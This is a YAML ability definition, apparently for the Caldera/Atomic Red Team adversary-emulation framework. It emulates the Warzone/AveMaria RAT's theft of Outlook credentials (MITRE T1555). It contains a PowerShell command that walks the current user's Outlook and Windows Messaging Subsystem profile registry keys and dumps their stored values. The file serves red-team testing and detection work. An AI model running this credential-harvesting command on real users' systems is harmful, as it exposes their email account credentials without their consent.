- id: 4a16a770-c1fc-494a-8131-022a0b147b3a
  name: Warzone/AveMaria RAT Style Credential Theft via Outlook Registry
  description: Emulates behaviors seen in the Warzone/AveMaria RAT, where credentials
    associated with a user's Microsoft Outlook profile are stolen through registry
    access. (https://www.splunk.com/en_us/blog/security/defending-the-gates-understanding-and-detecting-ave-maria-warzone-rat.html)
  tactic: credential-access
  technique:
    attack_id: T1555
    name: Credentials from Password Stores
  platforms:
    windows:
      psh:
        command: $hexId = "9375CFF0413111d3B88A00104B2A6676"; Get-ChildItem "HKCU:\Software\Microsoft\Office\*\Profiles\*"
          -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.PSChildName
          -eq $hexId } | ForEach-Object{Get-ItemProperty -Path $_.FullName}; if(Test-Path
          -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging
          Subsystem\Profiles\Outlook\$hexId"){; Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows
          NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\$hexId";
          }; if(Test-Path -Path "HKCU:\Software\Microsoft\Windows Messaging Subsystem\Profiles\$hexId"){;
          Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows Messaging Subsystem\Profiles\$hexId";
          }
        elevation_required: false
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - credential-access
  - t1555
  - atomic-red-team
  author: Atomic Red Team
